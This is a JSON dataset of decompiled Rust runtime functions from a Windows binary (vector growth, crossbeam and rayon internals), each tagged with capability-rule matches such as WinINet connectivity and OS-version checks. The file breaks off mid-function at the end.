            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::h209ca700d3c2e5e6\n                   (uint64_t *arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t arg2_00;\n    int64_t iStack72;\n    uint64_t uStack64;\n    uint64_t uStack48;\n    uint64_t uStack40;\n    uint64_t uStack32;\n    \n    // alloc::raw_vec::RawVec<T,A>::grow_amortized::h209ca700d3c2e5e6\n    uVar2 = arg2 + arg3;\n    if (!CARRY8(arg2, arg3)) {\n        uVar1 = arg1[1];\n        if (uVar2 < uVar1 * 2) {\n            uVar2 = uVar1 * 2;\n        }\n        arg2_00 = 8;\n        if (8 < uVar2) {\n            arg2_00 = uVar2;\n        }\n        if (uVar1 != 0) {\n            uStack48 = *arg1;\n            uStack40 = uVar1;\n        }\n        uStack32 = uVar1 != 0;\n        sym.alloc::raw_vec::finish_grow::haea89cfef0f1116c(&iStack72, arg2_00, 1, &uStack48);\n        uVar2 = uStack64;\n        if (iStack72 == 0) {\n            *arg1 = uStack64;\n            arg1[1] = arg2_00;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 380
    },
    "759dfdd9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::h759dfdd931a2252f\n                   (uint64_t *arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iStack72;\n    uint64_t uStack64;\n    uint64_t uStack48;\n    int64_t iStack40;\n    ulong uStack32;\n    \n    // alloc::raw_vec::RawVec<T,A>::grow_amortized::h759dfdd931a2252f\n    uVar2 = arg2 + arg3;\n    if (!CARRY8(arg2, arg3)) {\n        uVar1 = arg1[1];\n        if (uVar2 < uVar1 * 2) {\n            uVar2 = uVar1 * 2;\n        }\n        uVar3 = 4;\n        if (4 < uVar2) {\n            uVar3 = uVar2;\n        }\n        if (uVar1 == 0) {\n            uStack32 = 0;\n        }\n        else {\n            iStack40 = uVar1 * 0x10;\n            uStack48 = *arg1;\n            uStack32 = 8;\n        }\n        sym.alloc::raw_vec::finish_grow::haea89cfef0f1116c\n                  (&iStack72, SUB168(ZEXT816(uVar3) * ZEXT816(0x10), 0), \n                   (SUB168(ZEXT816(uVar3) * ZEXT816(0x10) >> 0x40, 0) == 0) << 3, &uStack48);\n        uVar2 = uStack64;\n        if (iStack72 == 0) {\n            *arg1 = uStack64;\n            arg1[1] = uVar3;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 435
    },
    "635adc2e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::h635adc2ea036215c\n                   (uint64_t *arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iStack72;\n    uint64_t uStack64;\n    uint64_t uStack48;\n    int64_t iStack40;\n    ulong uStack32;\n    \n    // alloc::raw_vec::RawVec<T,A>::grow_amortized::h635adc2ea036215c\n    uVar2 = arg2 + arg3;\n    if (!CARRY8(arg2, arg3)) {\n        uVar1 = arg1[1];\n        if (uVar2 < uVar1 * 2) {\n            uVar2 = uVar1 * 2;\n        }\n        uVar3 = 4;\n        if (4 < uVar2) {\n            uVar3 = uVar2;\n        }\n        if (uVar1 == 0) {\n            uStack32 = 0;\n        }\n        else {\n            iStack40 = uVar1 * 0x20;\n            uStack48 = *arg1;\n            uStack32 = 8;\n        }\n        sym.alloc::raw_vec::finish_grow::haea89cfef0f1116c\n                  (&iStack72, SUB168(ZEXT816(uVar3) * ZEXT816(0x20), 0), \n                   (SUB168(ZEXT816(uVar3) * ZEXT816(0x20) >> 0x40, 0) == 0) << 3, &uStack48);\n        uVar2 = uStack64;\n        if (iStack72 == 0) {\n            *arg1 = uStack64;\n            arg1[1] = uVar3;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 433
    },
    "45c2ac22": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_crossbeam_epoch::collector::LocalHandle_::h45c2ac2238b86eb3(uint64_t **arg1)\n\n{\n    uint64_t *puVar1;\n    uint64_t *puVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint64_t *puStack24;\n    \n    // core::ptr::drop_in_place<crossbeam_epoch::collector::LocalHandle>::h45c2ac2238b86eb3\n    puVar2 = *arg1;\n    uVar3 = puVar2[0x105];\n    puVar2[0x105] = uVar3 - 1;\n    if ((puVar2[0x104] == 0) && (uVar3 == 1)) {\n        puVar2[0x105] = 1;\n        uVar3 = puVar2[0x104];\n        uVar4 = uVar3 + 1;\n        puStack24 = puVar2;\n        if (uVar4 != 0) {\n            puVar2[0x104] = uVar4;\n            if (uVar3 == 0) {\n                LOCK();\n                puVar1 = puVar2 + 1;\n                *puVar1 = *puVar1 ^ (*puVar1 == 0) * (*puVar1 ^ (*(puVar2[2] + 0x180) | 1));\n                uVar3 = puVar2[0x106];\n                puVar2[0x106] = uVar3 + 1;\n                if ((uVar3 & 0x7f) == 0) {\n                    sym.crossbeam_epoch::internal::Global::collect::h6708353a970a45c2(puVar2[2] + 0x80);\n                }\n            }\n            puVar1 = puStack24;\n            sym.crossbeam_epoch::internal::Global::push_bag::h676195a937628f8d(puVar2[2] + 0x80);\n            if (((puVar1 != NULL) && (uVar3 = puVar1[0x104],  puVar1[0x104] = uVar3 - 1,  uVar3 == 1)) &&\n               (puVar1[1] = 0,  puVar1[0x105] == 0)) {\n                sym.crossbeam_epoch::internal::Local::finalize::hfd518d3b47aa7efc(puVar1);\n            }\n            puVar2[0x105] = 0;\n            puStack24 = puVar2[2];\n            LOCK();\n            *puVar2 = *puVar2 | 1;\n            sym.core::ptr::drop_in_place_crossbeam_epoch::collector::Collector_::hc8b5a31c7f8871af(&puStack24);\n            return;\n        }\n        dbg.panic(0x44bcbb, 0x2b, 0x448598);\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    return;\n}\n",
        "token_count": 678
    },
    "d880b243": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_crossbeam_epoch::guard::Guard_::hd880b2431d44c8fc(uint64_t **arg1)\n\n{\n    uint64_t *puVar1;\n    uint64_t *puVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint64_t *puStack24;\n    \n    // core::ptr::drop_in_place<crossbeam_epoch::guard::Guard>::hd880b2431d44c8fc\n    puVar2 = *arg1;\n    if (((puVar2 != NULL) && (uVar3 = puVar2[0x104],  puVar2[0x104] = uVar3 - 1,  uVar3 == 1)) &&\n       (puVar2[1] = 0,  puVar2[0x105] == 0)) {\n        puVar2[0x105] = 1;\n        uVar3 = puVar2[0x104];\n        uVar4 = uVar3 + 1;\n        puStack24 = puVar2;\n        if (uVar4 != 0) {\n            puVar2[0x104] = uVar4;\n            if (uVar3 == 0) {\n                LOCK();\n                puVar1 = puVar2 + 1;\n                *puVar1 = *puVar1 ^ (*puVar1 == 0) * (*puVar1 ^ (*(puVar2[2] + 0x180) | 1));\n                uVar3 = puVar2[0x106];\n                puVar2[0x106] = uVar3 + 1;\n                if ((uVar3 & 0x7f) == 0) {\n                    sym.crossbeam_epoch::internal::Global::collect::h6708353a970a45c2(puVar2[2] + 0x80);\n                }\n            }\n            puVar1 = puStack24;\n            sym.crossbeam_epoch::internal::Global::push_bag::h676195a937628f8d(puVar2[2] + 0x80);\n            if (((puVar1 != NULL) && (uVar3 = puVar1[0x104],  puVar1[0x104] = uVar3 - 1,  uVar3 == 1)) &&\n               (puVar1[1] = 0,  puVar1[0x105] == 0)) {\n                sym.crossbeam_epoch::internal::Local::finalize::hfd518d3b47aa7efc(puVar1);\n            }\n            puVar2[0x105] = 0;\n            puStack24 = puVar2[2];\n            LOCK();\n            *puVar2 = *puVar2 | 1;\n            sym.core::ptr::drop_in_place_crossbeam_epoch::collector::Collector_::hc8b5a31c7f8871af(&puStack24);\n            return;\n        }\n        dbg.panic(0x44bcbb, 0x2b, 0x448598);\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    return;\n}\n",
        "token_count": 694
    },
    "db3fa78f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym.std::sys_common::backtrace::__rust_begin_short_backtrace::hdb3fa78f4dcaf823(ulong *arg1)\n\n{\n    int64_t iVar1;\n    bool bVar2;\n    int64_t *piVar3;\n    ulong arg1_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    char *arg1_01;\n    ulong *puVar7;\n    ulong uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    ulong var_320h;\n    ulong var_338h;\n    ulong uStack1032;\n    uint64_t uStack944;\n    uint uStack936;\n    uint uStack932;\n    uint uStack928;\n    uint32_t uStack924;\n    uint64_t uStack920;\n    int64_t iStack912;\n    ulong uStack904;\n    uchar auStack896 [16];\n    int64_t iStack880;\n    uint64_t uStack872;\n    ulong uStack864;\n    ulong uStack856;\n    uint64_t uStack848;\n    uchar auStack840 [16];\n    uint uStack640;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    uint uStack624;\n    uint uStack620;\n    uint uStack616;\n    uint uStack612;\n    ulong uStack608;\n    uint64_t uStack600;\n    int64_t aiStack592 [15];\n    ulong auStack472 [5];\n    uint uStack432;\n    uint uStack428;\n    uint uStack424;\n    uint uStack420;\n    uint uStack416;\n    uint uStack412;\n    uint uStack408;\n    uint uStack404;\n    int64_t iStack400;\n    ulong uStack392;\n    uchar auStack384 [320];\n    \n    puVar7 = auStack472;\n    // std::sys_common::backtrace::__rust_begin_short_backtrace::hdb3fa78f4dcaf823\n    for (iVar5 = 0xb; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = *arg1;\n        arg1 = arg1 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    iStack912 = iStack400;\n    uStack904 = uStack392;\n    sym._crossbeam_deque::deque::Injector_T__as_core::default::Default_::default::hd082a672e925602a(auStack384);\n    uVar12 = 0;\n    uVar13 = 0;\n    uVar14 = 0;\n    uVar15 = 0;\n    uStack600 = 0;\n    while (uStack600 == 0) {\n        auStack896 = CONCAT412(uVar15, CONCAT48(uVar14, CONCAT44(uVar13, uVar12)));\n        auStack840 = CONCAT412(uVar15, CONCAT48(uVar14, CONCAT44(uVar13, uVar12)));\n        uStack872 = 0x736f6d6570736575;\n        uStack864 = 0x6c7967656e657261;\n        uStack856 = 0x646f72616e646f6d;\n        uStack848 = 0x7465646279746573;\n        LOCK();\n        uStack944 = *0x452040;\n        iStack880 = 8;\n        bVar2 = true;\n        iVar5 = 0;\n        *0x452040 = *0x452040 + 1;\n        while (bVar2) {\n            uVar9 = *(&uStack944 + iVar5);\n            uStack848 = uStack848 ^ uVar9;\n            sym._ZN69__LT_core..hash..sip..Sip13Rounds_u20_as_u20_core..hash..sip..Sip_GT_8c_rounds17hd77c6983cbb50731E.188\n                      (&uStack872);\n            uStack872 = uStack872 ^ uVar9;\n            bVar2 = false;\n            iVar5 = 8;\n        }\n        uStack928 = uStack856;\n        uStack924 = uStack856._4_4_;\n        uStack944 = uStack872;\n        uStack936 = uStack864;\n        uStack932 = uStack864._4_4_;\n        uVar9 = iStack880 << 0x38;\n        uStack920 = uStack848 ^ uVar9;\n        sym._ZN69__LT_core..hash..sip..Sip13Rounds_u20_as_u20_core..hash..sip..Sip_GT_8c_rounds17hd77c6983cbb50731E.188\n                  (&uStack944);\n        uVar10 = (uVar9 ^ uStack944) + CONCAT44(uStack924, uStack928);\n        uVar11 = (CONCAT44(uStack924, uStack928) << 0xd | uStack924 >> 0x13) ^ uVar10;\n        uVar9 = (CONCAT44(uStack932, uStack936) ^ 0xff) + uStack920;\n        uVar6 = (uStack920 << 0x10 | uStack920 >> 0x30) ^ uVar9;\n        uVar10 = (uVar10 << 0x20 | uVar10 >> 0x20) + uVar6;\n        uVar9 = uVar9 + uVar11;\n        uVar11 = (uVar11 << 0x11 | uVar11 >> 0x2f) ^ uVar9;\n        uVar6 = (uVar6 << 0x15 | uVar6 >> 0x2b) ^ uVar10;\n        uVar10 = uVar10 + uVar11;\n        uVar11 = (uVar11 << 0xd | uVar11 >> 0x33) ^ uVar10;\n        uVar9 = (uVar9 << 0x20 | uVar9 >> 0x20) + uVar6;\n        uVar6 = (uVar6 << 0x10 | uVar6 >> 0x30) ^ uVar9;\n        uVar10 = (uVar10 << 0x20 | uVar10 >> 0x20) + uVar6;\n        uVar9 = uVar9 + uVar11;\n        uVar11 = (uVar11 << 0x11 | uVar11 >> 0x2f) ^ uVar9;\n        uVar6 = (uVar6 << 0x15 | uVar6 >> 0x2b) ^ uVar10;\n        uVar9 = (uVar9 << 0x20 | uVar9 >> 0x20) + uVar6;\n        uVar10 = (uVar11 << 0xd | uVar11 >> 0x33) ^ uVar10 + uVar11;\n        uVar6 = (uVar6 << 0x10 | uVar6 >> 0x30) ^ uVar9;\n        uVar9 = uVar9 + uVar10;\n        uStack600 = (uVar10 << 0x11 | uVar10 >> 0x2f) ^ uVar9 ^ (uVar6 << 0x15 | uVar6 >> 0x2b) ^\n                    (uVar9 << 0x20 | uVar9 >> 0x20);\n    }\n    uStack624 = uStack416;\n    uStack620 = uStack412;\n    uStack616 = uStack408;\n    uStack612 = uStack404;\n    uStack640 = uStack432;\n    uStack636 = uStack428;\n    uStack632 = uStack424;\n    uStack628 = uStack420;\n    sym.memcpy(auStack896, auStack384, 0x100);\n    uVar8 = uStack904;\n    uStack608 = uStack904;\n    aiStack592[0] = iStack912;\n    uVar9 = 0;\n    piVar3 = sym.rayon_core::registry::WORKER_THREAD_STATE::__getit::h7425f3ef4f320343(0);\n    if (piVar3 != NULL) {\n        if (*piVar3 != 0) {\n            arg1_01 = \"assertion failed: t.get().is_null()\";\n            uVar8 = 0x4489d8;\n            uStack1032 = 0x23;\n            goto code_r0x0040f294;\n        }\n        *piVar3 = auStack896;\n    }\n    sym.core::result::Result_T_E_::expect::h6fc96e7fb30f4c91(uVar9 & 0xffffffffffffff00 | piVar3 == NULL);\n    iVar1 = aiStack592[0];\n    iVar5 = aiStack592[0] + 400;\n    arg1_00 = sym._alloc::vec::Vec_T_A__as_core::ops::index::Index_I__::index::h04ab1b1d1e48e3ed(iVar5, uVar8, 0x448a08)\n    ;\n    sym._rayon_core::latch::LockLatch_as_rayon_core::latch::Latch_::set::h654fa38a163bd2fb(arg1_00);\n    if (*(iVar1 + 0x1e8) != 0) {\n        (**(*(iVar1 + 0x1f0) + 0x28))(*(iVar1 + 0x1e8), uVar8);\n    }\n    iVar4 = sym._alloc::vec::Vec_T_A__as_core::ops::index::Index_I__::index::h04ab1b1d1e48e3ed(iVar5, uVar8, 0x448a20);\n    if (*(iVar4 + 0x30) != 3) {\n        sym.rayon_core::registry::WorkerThread::wait_until_cold::he4d2b893fce2942c(auStack896, iVar4 + 0x30);\n    }\n    iVar5 = sym._alloc::vec::Vec_T_A__as_core::ops::index::Index_I__::index::h04ab1b1d1e48e3ed(iVar5, uVar8, 0x448a38);\n    sym._rayon_core::latch::LockLatch_as_rayon_core::latch::Latch_::set::h654fa38a163bd2fb(iVar5 + 0x18);\n    if (*(iVar1 + 0x1f8) != 0) {\n        (**(*(iVar1 + 0x200) + 0x28))(*(iVar1 + 0x1f8), uVar8);\n    }\n    uVar9 = 0;\n    piVar3 = sym.rayon_core::registry::WORKER_THREAD_STATE::__getit::h7425f3ef4f320343(0);\n    if (piVar3 != NULL) {\n        if (*piVar3 != auStack896) {\n            arg1_01 = \"assertion failed: t.get().eq(&(self as *const _))\";\n            uVar8 = 0x448998;\n            uStack1032 = 0x31;\ncode_r0x0040f294:\n            dbg.panic(arg1_01, uStack1032, uVar8);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        *piVar3 = 0;\n    }\n    sym.core::result::Result_T_E_::expect::h6fc96e7fb30f4c91(uVar9 & 0xffffffffffffff00 | piVar3 == NULL);\n    sym._ZN4core3ptr155drop_in_place_LT_alloc..sync..Arc_LT_crossbeam_utils..cache_padded..CachePadded_LT_crossbeam_deque..deque..Inne\n              (&uStack640);\n    sym._crossbeam_deque::deque::Injector_T__as_core::ops::drop::Drop_::drop::h79661f8f1cce177b(auStack896);\n    sym.core::ptr::drop_in_place_alloc::sync::Arc_rayon_core::registry::Registry__::h7db2201568d2142d(aiStack592);\n    sym.core::ptr::drop_in_place_core::option::Option_alloc::string::String__::h0a9f8bc1ad08458b(auStack472);\n    return;\n}\n",
        "token_count": 2772
    },
    "0a9f8bc1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_core::option::Option_alloc::string::String__::h0a9f8bc1ad08458b(int64_t *arg1)\n\n{\n    // core::ptr::drop_in_place<core::option::Option<alloc::string::String>>::h0a9f8bc1ad08458b\n    if (*arg1 == 0) {\n        return;\n    }\n    if (arg1[1] == 0) {\n        return;\n    }\n    if (arg1[1] == 0) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *arg1);\n    return;\n}\n",
        "token_count": 208
    },
    "0afe3a00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_rayon_core::log::Logger_::h0afe3a00b5929015(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t **arg1_00;\n    uint64_t **ppuVar5;\n    uint64_t *puVar6;\n    uint64_t in_RDX;\n    uint64_t uVar7;\n    bool bVar8;\n    int64_t iStack48;\n    uchar uStack40;\n    \n    // core::ptr::drop_in_place<rayon_core::log::Logger>::h0afe3a00b5929015\n    iVar3 = *arg1;\n    if (iVar3 != 3) {\n        if (iVar3 == 0) {\n            LOCK();\n            piVar1 = arg1[1] + 0x200;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                iVar3 = arg1[1];\n                uVar4 = *(iVar3 + 0x80);\n                do {\n                    LOCK();\n                    puVar6 = iVar3 + 0x80;\n                    bVar8 = uVar4 == *puVar6;\n                    *puVar6 = *puVar6 ^ bVar8 * (*puVar6 ^ (uVar4 | *(iVar3 + 0x120)));\n                    uVar4 = uVar4 ^ !bVar8 * (uVar4 ^ *puVar6);\n                } while (!bVar8);\n                if ((*(iVar3 + 0x120) & uVar4) == 0) {\n                    sym.crossbeam_channel::waker::SyncWaker::disconnect::h67f518797c499da4(iVar3 + 0x128);\n                    sym.crossbeam_channel::waker::SyncWaker::disconnect::h67f518797c499da4(iVar3 + 0x170);\n                }\n                cVar2 = *(iVar3 + 0x210);\n                *(iVar3 + 0x210) = '\\x01';\n                if (cVar2 != '\\0') {\n                    puVar6 = arg1[1];\n                    sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_10deallocate17h82f390f816a480d0E.187\n                              (puVar6[0x20], puVar6[0x21] << 5, 8);\n                    sym.core::ptr::drop_in_place_crossbeam_channel::waker::Waker_::h9479c77d2c1c42a8(puVar6 + 0x27);\n                    sym.core::ptr::drop_in_place_crossbeam_channel::waker::Waker_::h9479c77d2c1c42a8(puVar6 + 0x30);\n                    uVar4 = 0x80;\n                    goto code_r0x00404d50;\n                }\n            }\n        }\n        else if (iVar3 == 1) {\n            LOCK();\n            piVar1 = arg1[1] + 0x180;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                iVar3 = arg1[1];\n                uVar4 = *(iVar3 + 0x80);\n                do {\n                    LOCK();\n                    puVar6 = iVar3 + 0x80;\n                    bVar8 = uVar4 == *puVar6;\n                    *puVar6 = *puVar6 ^ bVar8 * (*puVar6 ^ (uVar4 | 1));\n                    uVar4 = uVar4 ^ !bVar8 * (uVar4 ^ *puVar6);\n                } while (!bVar8);\n                if ((uVar4 & 1) == 0) {\n                    sym.crossbeam_channel::waker::SyncWaker::disconnect::h67f518797c499da4(iVar3 + 0x100);\n                }\n                cVar2 = *(iVar3 + 400);\n                *(iVar3 + 400) = '\\x01';\n                if (cVar2 != '\\0') {\n                    puVar6 = arg1[1];\n                    uVar4 = puVar6[0x10];\n                    arg1_00 = puVar6[1];\n                    for (uVar7 = *puVar6 & 0xfffffffffffffffe; (uVar4 & 0xfffffffffffffffe) != uVar7; uVar7 = uVar7 + 2)\n                    {\n                        ppuVar5 = arg1_00;\n                        if ((~uVar7 & 0x3e) == 0) {\n                            ppuVar5 = *arg1_00;\n                            sym.core::mem::drop::hd6e3221d05c2769d(arg1_00);\n                        }\n                        arg1_00 = ppuVar5;\n                    }\n                    if (arg1_00 != NULL) {\n                        sym.core::mem::drop::hd6e3221d05c2769d(arg1_00);\n                    }\n                    sym.core::ptr::drop_in_place_crossbeam_channel::waker::Waker_::h9479c77d2c1c42a8(puVar6 + 0x22);\n                    uVar4 = 0x80;\n                    goto code_r0x00404d50;\n                }\n            }\n        }\n        else {\n            piVar1 = arg1[1];\n            LOCK();\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                iVar3 = arg1[1];\n                iStack48 = iVar3 + 0x10;\n                sub.KERNEL32.dll_AcquireSRWLockExclusive(iStack48);\n                uVar4 = sym._ZN3std4sync6poison4Flag5guard17h7c1dc4a1daf9103dE.196(iVar3 + 0x18);\n                in_RDX = in_RDX & 0xffffffffffffff01;\n                uStack40 = in_RDX;\n                if ((uVar4 & 1) != 0) {\n                    dbg.unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", 0x2b, &iStack48, 0x448860);\n                    do {\n                        invalidInstructionException();\n                    } while( true );\n                }\n                if (*(iVar3 + 0x80) == '\\0') {\n                    *(iVar3 + 0x80) = 1;\n                    sym.crossbeam_channel::waker::Waker::disconnect::h2ed37ec08bbc3a90(iVar3 + 0x20, in_RDX);\n                    sym.crossbeam_channel::waker::Waker::disconnect::h2ed37ec08bbc3a90(iVar3 + 0x50, in_RDX);\n                }\n                sym._ZN4core3ptr96drop_in_place_LT_std..sync..mutex..MutexGuard_LT_crossbeam_channel..flavors..zero..Inner_GT__GT_17h815c327c037ed\n                          (&iStack48);\n                cVar2 = *(iVar3 + 0x88);\n                *(iVar3 + 0x88) = '\\x01';\n                if (cVar2 != '\\0') {\n                    puVar6 = arg1[1];\n                    sym.core::ptr::drop_in_place_crossbeam_channel::waker::Waker_::h9479c77d2c1c42a8(puVar6 + 4);\n                    sym.core::ptr::drop_in_place_crossbeam_channel::waker::Waker_::h9479c77d2c1c42a8(puVar6 + 10);\n                    uVar4 = 8;\ncode_r0x00404d50:\n                    if (0x10 < uVar4) {\n                        puVar6 = puVar6[-1];\n                    }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, puVar6);\n                    return;\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1823
    },
    "67f51879": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.crossbeam_channel::waker::SyncWaker::disconnect::h67f518797c499da4(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t in_RDX;\n    bool bVar2;\n    int64_t iStack24;\n    uchar uStack16;\n    \n    // crossbeam_channel::waker::SyncWaker::disconnect::h67f518797c499da4\n    sub.KERNEL32.dll_AcquireSRWLockExclusive();\n    uVar1 = sym._ZN3std4sync6poison4Flag5guard17h7c1dc4a1daf9103dE.196(arg1 + 8);\n    uStack16 = in_RDX & 0xffffffffffffff01;\n    iStack24 = arg1;\n    if ((uVar1 & 1) == 0) {\n        sym.crossbeam_channel::waker::Waker::disconnect::h2ed37ec08bbc3a90(arg1 + 0x10, in_RDX & 0xffffffffffffff01);\n        if (*(arg1 + 0x20) == 0) {\n            bVar2 = *(arg1 + 0x38) == 0;\n        }\n        else {\n            bVar2 = false;\n        }\n        *(arg1 + 0x40) = bVar2;\n        sym.core::ptr::drop_in_place_std::sync::mutex::MutexGuard_crossbeam_channel::waker::Waker__::hefde135fea272c6f\n                  (&iStack24);\n        return;\n    }\n    dbg.unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", 0x2b, &iStack24, 0x4488a0);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 393
    },
    "e4d2b893": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym.rayon_core::registry::WorkerThread::wait_until_cold::he4d2b893fce2942c(int64_t arg1, uint64_t *arg2)\n\n{\n    int64_t **arg1_00;\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    char cVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    int64_t **ppiVar8;\n    int64_t iVar9;\n    int64_t *in_R8;\n    unkbyte7 in_R9;\n    uint32_t uVar10;\n    uint64_t *puVar12;\n    int64_t *unaff_R13;\n    uint64_t *puVar13;\n    bool bVar14;\n    uint8_t uStack261;\n    uint32_t uStack260;\n    uint64_t *puStack256;\n    int64_t iStack248;\n    uint64_t uStack240;\n    uint64_t *puStack232;\n    uint64_t *puStack224;\n    ulong uStack216;\n    uint64_t *puStack208;\n    uint64_t *puStack200;\n    int64_t iStack192;\n    ulong uStack184;\n    int64_t iStack176;\n    int64_t *piStack168;\n    uint32_t uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint64_t uStack136;\n    int64_t iStack128;\n    ulong *puStack120;\n    int64_t *piStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    uint64_t *puStack72;\n    uint64_t *puVar11;\n    \n    // rayon_core::registry::WorkerThread::wait_until_cold::he4d2b893fce2942c\n    uStack184 = *(arg1 + 0x120);\n    LOCK();\n    piVar2 = *(arg1 + 0x130) + 0x1d0;\n    *piVar2 = *piVar2 + 0x10000;\n    iStack128 = arg1 + 0x100;\n    puVar12 = arg2;\n    puStack256 = arg2;\n    iStack248 = arg1;\ncode_r0x0040fc5d:\n    uStack260 = 0;\n    uStack136 = 0xffffffffffffffff;\ncode_r0x0040fc74:\n    if (*puVar12 == 3) {\n        sym.rayon_core::sleep::Sleep::work_found::h7414ea3b54864ef5(*(arg1 + 0x130) + 0x1a8);\n        return;\n    }\n    piVar2 = sym.crossbeam_deque::deque::Worker_T_::pop::heffa62d1c96fb557(iStack128);\n    puVar13 = arg2;\n    if (arg2 == NULL) {\n        iVar9 = *(arg1 + 0x130);\n        uStack80 = *(iVar9 + 400);\n        puVar11 = *(iVar9 + 0x1a0);\n        puStack120 = &uStack80;\n        iStack176 = arg1;\n        puStack72 = puVar11;\n        if (0x1 < puVar11) {\ncode_r0x0040fcdf:\n            uStack261 = 0;\n            uVar6 = *(iStack176 + 0x128) >> 0xc ^ *(iStack176 + 0x128);\n            uVar6 = uVar6 << 0x19 ^ uVar6;\n            uVar6 = uVar6 